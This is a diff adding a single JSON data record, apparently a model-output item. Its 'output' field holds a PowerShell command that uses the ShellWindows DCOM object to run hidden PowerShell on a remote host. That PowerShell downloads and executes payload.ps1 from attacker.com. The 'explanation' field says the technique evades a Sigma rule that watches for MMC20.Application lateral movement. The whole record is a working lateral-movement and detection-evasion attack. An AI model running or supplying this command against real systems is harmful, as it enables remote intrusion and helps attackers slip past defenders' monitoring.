@@ -1,0 +1,6 @@
+[
+  {
+    "output": "$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"ShellWindows\", \"Target-IP\")); $com.Item().Document.Application.ShellExecute(\"cmd.exe\", \"/c powershell.exe -nop -w hidden -c \\\"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\\\"\", \"c:\\windows\\system32\", $null, 0)",
+    "explanation": "This command bypasses the specific MMC20.Application detection rule by utilizing an alternative DCOM object (ShellWindows) to perform the lateral movement. Since the Sigma rule strictly monitors for 'mmc.exe' spawning from 'svchost.exe' with the '-Embedding' flag, invoking a different DCOM object like ShellWindows or Excel.Application achieves remote code execution without matching the hardcoded executable names in the detection logic."
+  }
+]
